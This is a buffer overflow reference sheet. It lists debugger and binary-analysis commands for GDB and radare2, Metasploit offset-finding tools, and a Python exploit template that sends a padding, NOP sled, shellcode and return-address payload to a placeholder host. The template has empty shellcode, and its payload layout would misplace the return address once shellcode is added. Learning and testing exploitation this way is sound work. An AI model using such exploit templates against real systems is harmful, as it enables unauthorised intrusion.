# Buffer Overflow Analysis Reference

This document contains essential commands for analyzing and exploiting buffer
overflow vulnerabilities.

---

## 1. Binary Analysis

### Check Architecture and Format

```bash
# Determine binary type, architecture, and format
file <binary>
```

### Security Features Analysis

```bash
# Check for security features (ASLR, NX, PIE, etc.)
checksec <binary>
```

---

## 2. GDB Commands

### Function Analysis

```bash
# Find address of a specific function
p <function name>
```

### State Inspection

```bash
# Display current register values
info registers

# Display current call stack
info stack
```

### Additional Useful GDB Commands

```bash
# Set breakpoint at address/function
break *0x12345678
break main

# Examine memory
x/20wx $esp     # Examine 20 words as hex from ESP
x/s 0x12345678  # Examine as string

# Generate pattern and find offset
pattern create 200
pattern offset 0x41414141
```

---

## 3. Radare2 Analysis

### Starting Radare2

```bash
# Debug mode with auto-analysis
r2 -AA -d ./binary
```

### Navigation Commands

```bash
# Set seek to specific function
s <function name>

# List all functions
afl

# Print disassembly of current function
pdf

# Print strings in binary
iz
```

### Debugging Commands

```bash
# Breakpoint management
F2      # Set breakpoint at current position
db 0x12345678  # Set breakpoint at address

# Execution control
F9      # Continue execution
F7      # Step into instruction
F8      # Step over instruction
F6      # Step in
```

---

## 4. Exploitation Template

### Pattern Generation (Metasploit)

```bash
# Create pattern of specific length
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800

# Find offset from pattern
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41414141
```

### Basic Exploit Structure

```python
#!/usr/bin/python3
import struct
import socket

# Target details
HOST = "192.168.1.1"
PORT = 9999

# Exploit components
buffer_size = 1024
offset = 146  # Determined from pattern_offset
eip = struct.pack("<I", 0x12345678)  # Return address (little-endian)
nop_sled = b"\x90" * 16  # NOP sled
shellcode = b""  # Your shellcode here
padding = b"A" * (offset - len(nop_sled))

# Construct payload
payload = padding + nop_sled + shellcode + eip + b"C" * (
            buffer_size - offset - len(eip))

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(payload)
s.close()
```
